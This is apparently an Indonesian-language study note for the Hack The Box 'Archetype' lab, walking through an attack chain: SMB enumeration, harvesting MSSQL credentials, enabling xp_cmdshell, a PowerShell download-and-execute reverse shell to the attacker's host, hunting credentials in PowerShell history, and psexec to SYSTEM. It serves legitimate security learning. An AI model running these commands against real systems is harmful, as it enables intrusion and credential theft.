```
=== HTB Starting Point — Archetype ===
[19 Apr 2026]

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 INFO MACHINE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Nama       : Archetype
OS         : Windows Server 2019
Difficulty : Very Easy (Starting Point Tier 2)
Tema       : SMB Enum → MSSQL Exploit → RCE → PrivEsc
Skill      : SMB enumeration, MSSQL abuse,
             Reverse Shell, PowerShell history hunting

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 ALUR SERANGAN (ATTACK CHAIN)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Nmap scan          → temukan port terbuka
2. SMB enumeration    → temukan share "backups"
3. Download file      → prod.dtsConfig berisi kredensial
4. Login MSSQL        → pakai impacket-mssqlclient
5. Aktifkan xp_cmdshell → jalankan command Windows dari SQL
6. Reverse Shell      → upload & eksekusi shell.ps1
7. User Flag          → C:\Users\sql_svc\Desktop\user.txt
8. PowerShell History → temukan kredensial Administrator
9. psexec             → login sebagai SYSTEM
10. Root Flag         → C:\Users\Administrator\Desktop\root.txt

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 TOOLS & COMMANDS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ NMAP ]
nmap -sV -sC -T4 <IP>
  -sV  → deteksi versi service
  -sC  → jalankan default scripts
  -T4  → speed scan (agresif, aman di HTB)

[ SMBCLIENT ]
smbclient -N -L <IP>
  -N   → no password (anonymous)
  -L   → list semua share

smbclient -N \\\\<IP>\\backups
  → masuk ke share "backups" tanpa password

Perintah di dalam smbclient:
  ls         → lihat isi folder
  get <file> → download file ke Kali
  exit       → keluar

[ IMPACKET - MSSQL ]
impacket-mssqlclient DOMAIN/user:password@<IP> -windows-auth
  -windows-auth → login pakai akun Windows (bukan SQL account)
  Tanda akun Windows = ada DOMAIN\username (ada backslash)
  Tanda akun SQL     = username saja, tanpa domain

[ MSSQL - AKTIFKAN xp_cmdshell ]
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
  → show advanced options harus diaktifkan dulu
    karena xp_cmdshell tersembunyi di balik advanced options
  → RECONFIGURE = terapkan perubahan konfigurasi
  → angka 1 = aktif, angka 0 = nonaktif

[ xp_cmdshell ]
EXEC xp_cmdshell 'whoami';
  → jalankan command Windows langsung dari SQL
  → BERBAHAYA karena SQL Server jadi pintu masuk ke sistem Windows

[ REVERSE SHELL - SETUP ]
Kali perlu 3 terminal:
  T1 → MSSQL session (untuk trigger download & eksekusi)
  T2 → HTTP Server  → python3 -m http.server 80
  T3 → NC Listener  → nc -lvnp 443
         -l  = listen mode
         -v  = verbose
         -n  = no DNS lookup
         -p  = port yang dipakai

[ SHELL.PS1 - BUAT FILE ]
cat > shell.ps1 << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient("<IP_KALI>",443);...
EOF
  → IP yang dipakai = IP tun0 (VPN HTB), bukan eth0

[ TRIGGER DOWNLOAD DAN EKSEKUSI DARI MSSQL ]
EXEC xp_cmdshell 'powershell -c "IEX
(New-Object Net.WebClient).DownloadString(
\"http://<IP_KALI>/shell.ps1\")"';
  → Windows download shell.ps1 dari HTTP server Kali
  → Langsung dieksekusi → konek balik ke nc listener

[ IMPACKET - PSEXEC ]
impacket-psexec administrator:'password'@<IP>
  → login ke Windows sebagai Administrator
  → dapet shell level SYSTEM (tertinggi di Windows)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 KONSEP PENTING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SMB (Server Message Block)
  → Protokol Windows untuk file sharing antar komputer
  → Port 139 (lama/NetBIOS) dan 445 (modern)
  → Misconfigured share = bisa diakses tanpa password

Custom Share vs Default Share
  → ADMIN$, C$, IPC$ = default Windows, otomatis di-protect
  → "backups", dll   = custom, sering misconfigured oleh admin

.dtsConfig
  → File konfigurasi SSIS (SQL Server Integration Services)
  → Sering menyimpan connection string + kredensial database

xp_cmdshell
  → Stored procedure MSSQL untuk eksekusi command Windows
  → Default: NONAKTIF (security feature)
  → Jika diaktifkan = SQL Server bisa jadi pintu masuk RCE

RCE vs Reverse Shell
  → RCE           = eksekusi command satu per satu, dapat output
  → Reverse Shell = shell interaktif dua arah, lebih bebas

Kenapa port 443 untuk listener?
  → Port HTTPS yang sangat umum
  → Firewall jarang blokir → traffic terlihat normal

Cara bedain file vs folder di smbclient:
  → D  = Directory → pakai cd
  → AR = File      → pakai get

Windows Authentication vs SQL Authentication
  → Windows Auth = login pakai akun Windows/AD (ada DOMAIN\user)
  → SQL Auth     = login pakai akun SQL Server (user saja)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 PRIVILEGE ESCALATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
WinPEAS
  → Tool otomatis cari celah privesc di Windows
  → Cek: history, registry, service, scheduled task, dll
  → Fokus output warna MERAH/KUNING = paling kritis

PowerShell History (manual & via WinPEAS)
  → Path: C:\Users\<user>\AppData\Roaming\Microsoft\
           Windows\PowerShell\PSReadLine\
           ConsoleHost_history.txt
  → Menyimpan semua command yang pernah diketik user
  → Sering ada kredensial yang pernah dipakai admin!

Alternatif cari kredensial di Windows:
  → Registry    : reg query HKLM /f password /t REG_SZ /s
  → Config files: cari .xml, .ini, .config
  → Unattended  : unattend.xml (sering ada password!)
  → Scheduled Tasks: script otomatis yang hardcode password

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 MINDSET ENUMERATE (REAL WORLD)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Jangan tebak — selalu enumerate!

Langkah orientasi setelah dapat shell:
  1. whoami              → siapa kita?
  2. whoami /priv        → privilege apa yang kita punya?
  3. cd C:\Users & dir   → ada user siapa saja?
  4. dir tiap user       → Desktop, Documents, Downloads
  5. Cari file menarik   → .txt, .xml, .ini, .ps1, .bat

File menarik yang perlu dicari:
  → *.txt, *.xml, *.ini  = notes, config, credentials
  → *.ps1, *.bat         = script yang mungkin ada password
  → password*, secret*   = obvious tapi sering ada!

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 TIPS & CATATAN
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
→ IP yang dipakai di HTB = IP tun0 (VPN), bukan eth0
→ ip a show tun0         = cek IP VPN kamu
→ Di Windows cek IP      = ipconfig
→ Backslash di Linux terminal: \ asli = tulis \\
→ Ekstensi PowerShell    = .ps1 (huruf L kecil, bukan angka 1)
→ cat (Linux) = type (Windows CMD)
→ ls  (Linux) = dir (Windows CMD)
→ T4 aman di HTB, hindari di real network (bisa trigger IDS)
→ HTTP server python harus dijalankan di folder yang sama
  dengan file yang ingin diakses target
→ File yang dibuat di Kali tetap ada meski VM di-restart,
  tapi session terminal harus mulai ulang
→ Port 443 untuk listener = bypass firewall (terlihat seperti HTTPS)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 ISTILAH PENTING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Misconfiguration  = kesalahan konfigurasi yang jadi celah keamanan
Credential        = kombinasi username + password
RCE               = Remote Code Execution, eksekusi kode dari jarak jauh
Reverse Shell     = koneksi dari target balik ke attacker
Listener          = program yang menunggu koneksi masuk
Foothold          = akses awal yang berhasil didapat
PrivEsc           = Privilege Escalation, naikkan level akses
SYSTEM            = level akses tertinggi di Windows
Stored Procedure  = fungsi bawaan yang tersimpan di database
Connection String = teks konfigurasi koneksi ke database
```